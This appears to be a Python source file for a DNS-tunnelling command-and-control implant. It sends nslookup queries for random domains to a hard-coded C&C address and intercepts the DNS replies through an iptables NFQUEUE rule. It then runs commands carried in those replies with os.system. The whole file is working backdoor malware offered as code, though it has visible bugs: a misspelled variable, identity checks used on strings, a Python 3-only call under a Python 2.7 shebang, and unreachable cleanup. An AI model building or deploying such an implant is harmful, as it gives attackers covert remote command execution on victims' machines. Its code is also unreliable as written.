#! /usr/bin/env python2.7

import multiprocessing, os
import random
from scapy.all import *
from netfilterqueue import NetfilterQueue

RANDOM_CHARS = 'abcdefghijklmnopqrstuvwxyz1234567890.'
RAND_MIN_LEN = 7
RAND_MAX_LEN = 15

CCIP = '10.4.18.1'  # C&C Server
QUERY_DELAY = 60  # In seconds

lastcommand = ''  # The previous command received


def read(packet):
    # Convert the raw packet to a scapy compatible string
    scapy_pkt = IP(packet.get_payload())

    # Read packet payload and run command if asked
    if scapy_pkt.haslayer(DNSRR):
        # If the packet is a DNS Resource Record (DNS reply)
        try:
            # Check if source IP is C&C server
            if scapy_pkt[IP].src is CCIP and DNSQR in scapy_pkt:
                # Check if packet has TXT record
                if scapy_pky[DNS].id == 0x1337:
                    print('[!] Found command')
                    getcommand(scapy_pkt)

        except IndexError:
            # Not UDP packet, this can be IPerror/UDPerror packets
            pass

    # Accept the packet
    packet.accept()


# Checks for command in TXT resource record
def getcommand(scapy_pkt):
    global lastcommand

    # Get command text
    command = str(scapy_pkt[DNS].an.rdata)
    print('[!] Command:', command)

    if command is not lastcommand:
        # Run command on system
        os.system(command)
        print('[!] Command complete')
        lastcommand = command


# Creates a random fake domain name
def generate_randomname():
    # Add random characters a random number of times
    length = random.randrange(RAND_MIN_LEN, RAND_MAX_LEN)
    name = ''.join(random.choice(RANDOM_CHARS) for i in range(length))
    return name + random.choice(['.com', '.net', '.org', '.co.uk'])


nfqueue = NetfilterQueue()


def run_nfqueue():
    try:
        print('[*] NFQUEUE running')
        nfqueue.run()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    # Setup the iptables rule and nfqueue
    os.system('iptables -A PREROUTING -p udp -m udp --sport 53 -j NFQUEUE --queue-num 1')
    print('[*] iptables rule created')
    nfqueue.bind(1, read)  # iptables queue number and callback function

    # Start the nfqueue packet reading portion in a separate process
    multiprocessing.set_start_method('fork')
    nfqueue_process = multiprocessing.Process(target=run_nfqueue)
    nfqueue_process.start()

    while(True):
        try:
            randomname = generate_randomname()
            os.system('nslookup ' + randomname + ' ' + CCIP)
            print('[+] Sent DNS query:', randomname)
            time.sleep(QUERY_DELAY)
        except KeyboardInterrupt:
            pass
    
    # Join processes and remove iptables rule
    nfqueue_process.join()
    os.system('iptables -D PREROUTING -p udp -m udp --sport 53 -j NFQUEUE --queue-num 1')
    print('[*] iptables rule removed')